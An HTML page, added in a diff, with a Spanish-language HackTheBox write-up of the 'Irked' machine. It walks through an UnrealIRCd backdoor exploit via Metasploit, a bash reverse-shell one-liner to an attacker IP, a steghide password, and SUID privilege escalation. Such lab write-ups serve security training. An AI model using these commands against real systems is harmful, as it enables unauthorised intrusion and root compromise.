@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Irked Machine - HackTheBox · Celero0 Blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="CeleroRKX">
+<meta name="description" content="Esta es una máquina linux de nivel Easy de HackTheBox">
+<meta name="keywords" content="blog,developer,personal">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Irked Machine - HackTheBox">
+  <meta name="twitter:description" content="Esta es una máquina linux de nivel Easy de HackTheBox">
+
+<meta property="og:url" content="https://celero0.github.io/posts/irked/">
+  <meta property="og:site_name" content="Celero0 Blog">
+  <meta property="og:title" content="Irked Machine - HackTheBox">
+  <meta property="og:description" content="Esta es una máquina linux de nivel Easy de HackTheBox">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-25T23:24:58+00:00">
+    <meta property="article:modified_time" content="2025-11-25T23:24:58+00:00">
+
+
+
+
+<link rel="canonical" href="https://celero0.github.io/posts/irked/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="https://celero0.github.io/">
+      Celero0 Blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="https://celero0.github.io/posts/irked/">
+              Irked Machine - HackTheBox
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-11-25T23:24:58Z">
+                November 25, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              3-minute read
+            </span>
+          </div>
+          
+          
+          
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <hr>
+<ul>
+<li>Tags: #Linux #steghide #IRC</li>
+</ul>
+<hr>
+<h1 id="enumeración-nmap">
+  Enumeración Nmap
+  <a class="heading-link" href="#enumeraci%c3%b3n-nmap">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p><strong>Comando:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS -vvv --min-rate <span style="color:#a5d6ff">5000</span> -n -Pn 10.10.10.117 -oG allPorts
+</span></span></code></pre></div><p>En <code>Service Info</code> Podemos ver que nos muestran el nombre de dominio <code>irked.htb</code>
+<img src="/images/Pasted image 20251019210429.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<p>Por tanto lo agregaremos a nuestro <code>/etc/hosts</code>
+<img src="/images/Pasted image 20251019210544.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<h1 id="enumeración-puerto-http-80">
+  Enumeración puerto HTTP 80
+  <a class="heading-link" href="#enumeraci%c3%b3n-puerto-http-80">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Viendo por el servicio web, no encontramos nada interesante, solo una imagen y un mensaje que dice que <code>IRC is almost working!</code>, como vimos en el escaneo sabemos que algunos puertos están corriendo el servicio <code>IRC</code>.
+<img src="/images/Pasted image 20251019210716.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<h1 id="enumeración-servicio-irc">
+  Enumeración servicio IRC
+  <a class="heading-link" href="#enumeraci%c3%b3n-servicio-irc">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<h2 id="qué-es-irc">
+  ¿Qué es IRC?
+  <a class="heading-link" href="#qu%c3%a9-es-irc">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>IRC significa <strong>Internet Relay Chat</strong>, y es un <strong>protocolo de comunicación en tiempo real</strong> que permite a varias personas conversar entre sí a través de <strong>canales</strong> (como salas de chat).</p>
+<p>Funciona con un modelo <strong>cliente-servidor</strong>:</p>
+<ul>
+<li>
+<p>Tú usas un <strong>cliente IRC</strong> (un programa o aplicación).</p>
+</li>
+<li>
+<p>Ese cliente se conecta a un <strong>servidor IRC</strong> (un equipo que gestiona las salas de chat y los usuarios conectados).</p>
+</li>
+</ul>
+<h2 id="pentest">
+  Pentest
+  <a class="heading-link" href="#pentest">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Como vimos en el escaneo, tenemos 4 puertos válidos para intentar conectarnos
+<img src="/images/Pasted image 20251019211450.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<p>Para conectarnos a IRC utilizaremos la herramienta <code>irssi</code> de la siguiente manera</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>irssi
+</span></span></code></pre></div><p>y luego dentro de la interfaz escribiremos</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/connect 10.10.10.117 <span style="color:#a5d6ff">6697</span>
+</span></span></code></pre></div><img src="/images/Pasted image 20251019212155.png" style="width:100%; height:auto; display:block; margin:auto;">
+y vemos como nos conecta al host, dandonos la versión de IRC que está corriendo en el sistema `Unreal3.2.8.1`
+<img src="/images/Pasted image 20251019212307.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Buscando por <code>Unreal 3.2.8.1</code> en searchsploit encontramos los siguientes exploits
+<img src="/images/Pasted image 20251019212401.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<h1 id="explotación-irc-unrealircd-3281">
+  Explotación IRC UnrealIRCd 3.2.8.1
+  <a class="heading-link" href="#explotaci%c3%b3n-irc-unrealircd-3281">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Para realizar la explotación utilizaremos metasploit, y utilizaremos el siguiente exploit <code>exploit/unix/irc/unreal_ircd_3281_backdoor</code>
+<img src="/images/Pasted image 20251019212502.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<p>Colocamos el RHOSTS:<code>10.10.10.117</code> y el RPORT:<code>6697</code>y usamos <code>show payloads</code>
+y usamos <code>set PAYLOAD cmd/unix/reverse_perl</code>
+<img src="/images/Pasted image 20251019212900.png" style="width:100%; height:auto; display:block; margin:auto;">
+Le damos nuestra IP al payload con <code>set LHOST 10.10.10.14.2</code> y le damos a <code>run</code>,
+obteniendo una consola
+<img src="/images/Pasted image 20251019213038.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<h1 id="tratamiento-tty">
+  Tratamiento tty
+  <a class="heading-link" href="#tratamiento-tty">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Primeros nos mandaremos una reverse shell, para salir del metasploit y tratar la tty</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -c <span style="color:#a5d6ff">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.2/9999 0&gt;&amp;1&#39;</span>
+</span></span></code></pre></div><img src="/images/Pasted image 20251019213156.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Aplicamos los siguientes comandos</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>script /dev/null -c bash
+</span></span><span style="display:flex;"><span>ctrl+z
+</span></span><span style="display:flex;"><span>stty raw -echo; fg
+</span></span><span style="display:flex;"><span>reset xterm
+</span></span><span style="display:flex;"><span>export <span style="color:#79c0ff">TERM</span><span style="color:#ff7b72;font-weight:bold">=</span>xterm
+</span></span><span style="display:flex;"><span>export <span style="color:#79c0ff">SHELL</span><span style="color:#ff7b72;font-weight:bold">=</span>bash
+</span></span><span style="display:flex;"><span>stty rows <span style="color:#a5d6ff">39</span> columns <span style="color:#a5d6ff">157</span>
+</span></span></code></pre></div><h1 id="movimiento-lateral">
+  Movimiento lateral
+  <a class="heading-link" href="#movimiento-lateral">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Viendo el <code>/etc/passwd</code> encontramos 3 usuarios con consolas, el nuestro <code>ircd</code>, <code>djmardov</code>, y <code>root</code>.</p>
+<p>Yendo al <code>home</code> de <code>djmardov</code> nos encontramos con lo siguiente
+<img src="/images/Pasted image 20251019213516.png" style="width:100%; height:auto; display:block; margin:auto;">
+Tenemos acceso a todos los directorios, pero no tenemos acceso a leer la <code>user.txt</code></p>
+<p>Para listar todos los archivos de los directorios utilizamos el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -la *
+</span></span></code></pre></div><p>y vemos que hay un archivo llamado <code>.backup</code> en el directorio <code>Documents</code>
+<img src="/images/Pasted image 20251019213920.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<h2 id="estenografía">
+  Estenografía
+  <a class="heading-link" href="#estenograf%c3%ada">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Viendo que hay en el archivo nos encontramos lo siguiente
+<img src="/images/Pasted image 20251019214018.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<p>Parece ser la contraseña de un archivo de estenografía, como el único archivo que encontramos es la imagen en el puerto 80, la descargaremos y utilizaremos steghide para probar si guarda algún secreto</p>
+<p>Con la herramineta <code>steghide</code> utilizaremos el siguiente comando para extraer posible información</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
+</span></span></code></pre></div><p>Consiguiente el archivo <code>pass.txt</code>
+<img src="/images/Pasted image 20251019215105.png" style="width:100%; height:auto; display:block; margin:auto;">
+el cual tiene la posible contraseña de <code>djmardov</code>
+<img src="/images/Pasted image 20251019215135.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<p>Probamos conectarnos por SSH con la contraseña encontrada, y obtenemos la user.txt
+<img src="/images/Pasted image 20251019215251.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<h1 id="escalada-de-privilegios">
+  Escalada de privilegios
+  <a class="heading-link" href="#escalada-de-privilegios">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Buscando por archivos SSUID con el siguiente comando</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
+</span></span></code></pre></div><p>Nos encontramos con el binario <code>/usr/bin/viewuser</code> que no es binario del sistema, por tanto vemos si su propietario es <code>root</code>
+<img src="/images/Pasted image 20251019215519.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<p>Como su propietario es <code>root</code> al ejecutarlo, lo ejecutamos como el usuario <code>root</code>, por tanto lo ejecutaremos para ver que hace
+<img src="/images/Pasted image 20251019215614.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+<p>Vemos que el archivo nos muestra un error, el error es que no existe el archivo <code>/tmp/listusers</code>, por tanto si tenemos permiso de escritura, podemos crear un script malicioso con ese nombre en el directorio <code>/tmp</code> y obtener acceso de root</p>
+<img src="/images/Pasted image 20251019215838.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora volvemos a correr el script <code>/usr/bin/viewuser</code>
+y hacemos un <code>bash -p</code>, y vemos que obtenemos permisos de root
+<img src="/images/Pasted image 20251019215931.png" style="width:100%; height:auto; display:block; margin:auto;">
+y leemos la flag pwneando la máquina
+<img src="/images/Pasted image 20251019215945.png" style="width:100%; height:auto; display:block; margin:auto;"></p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2025
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
